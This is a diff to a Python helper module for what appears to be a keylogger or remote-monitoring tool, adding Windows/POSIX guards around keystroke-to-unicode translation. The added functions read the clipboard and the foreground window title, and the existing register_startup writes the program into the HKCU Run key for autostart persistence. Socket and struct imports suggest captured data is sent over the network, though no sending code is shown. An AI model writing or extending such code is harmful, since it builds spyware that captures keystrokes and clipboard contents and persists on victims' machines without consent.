@@ -1,11 +1,19 @@
 import winreg
-from ctypes import windll, create_unicode_buffer
+import os
 from threading import Thread
-import win32api
 from socket import *
 import struct
 from collections import OrderedDict
 import keyboard
+
+if os.name == 'nt':
+    import win32api
+    import win32gui
+    import win32clipboard
+    from ctypes import windll, create_unicode_buffer
+    user32 = windll.user32
+elif os.name == 'posix':
+    from subprocess import check_output
 
 
 class Event:
@@ -81,15 +89,19 @@ def ToUnicode(sc):
     Returns:
         Unicode localed representation of the birtual key code
     """
-    def _ToUnicode(results):
-        b = create_unicode_buffer(1)
-        if windll.user32.ToUnicode(win32api.MapVirtualKey(sc, 3), sc, win32api.GetKeyboardState(), b, 1, 0) == 1:
-            results[0] = b.value
-    results = [""]
-    t = Thread(target=_ToUnicode, args=(results,))
-    t.start()
-    t.join()
-    return results[0]
+
+    if os.name == "nt":
+        def _ToUnicode(results):
+            b = create_unicode_buffer(1)
+            if user32.ToUnicode(win32api.MapVirtualKey(sc, 3), sc, win32api.GetKeyboardState(), b, 1, 0) == 1:
+                results[0] = b.value
+        results = [""]
+        t = Thread(target=_ToUnicode, args=(results,))
+        t.start()
+        t.join()
+        return results[0]
+    elif os.name == "posix":
+        return ""
 
 
 def get_modifiers():
@@ -118,6 +130,22 @@ def is_modifier(key):
     return key[key.find(" ")+1:] in keyboard.all_modifiers[:-1]  # ignore side + ignore windows
 
 
+def GetClipboard():
+    if os.name == "nt":
+        win32clipboard.OpenClipboard()
+        clip = win32clipboard.GetClipboardData(
+            win32clipboard.CF_UNICODETEXT)
+        win32clipboard.CloseClipboard()
+        return clip
+    elif os.name == "posix":
+        return ""
+
+def GetForegroundWindowTitle():
+    if os.name == "nt":
+        return GetWindowTextW(win32gui.GetForegroundWindow())
+    elif os.name == "posix":
+        return ""
+
 def GetWindowTextW(hwnd):
     """
     Gets the unicode title of a window
@@ -128,9 +156,9 @@ def GetWindowTextW(hwnd):
     Returns:
         Unicode title
     """
-    length = windll.user32.GetWindowTextLengthW(hwnd)
+    length = user32.GetWindowTextLengthW(hwnd)
     buff = create_unicode_buffer(length + 1)
-    windll.user32.GetWindowTextW(hwnd, buff, length + 1)
+    user32.GetWindowTextW(hwnd, buff, length + 1)
     return buff.value
 
 
@@ -142,5 +170,8 @@ def register_startup(name, path):
         name: the giben name to the startup object
         path: path to the file to startup
     """
-    winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
-                                     winreg.KEY_ALL_ACCESS), name, 1, winreg.REG_SZ, '"%s"' % path)
+    if os.name == "nt":
+        winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
+                                         winreg.KEY_ALL_ACCESS), name, 1, winreg.REG_SZ, '"%s"' % path)
+    elif os.name == "posix":
+        pass
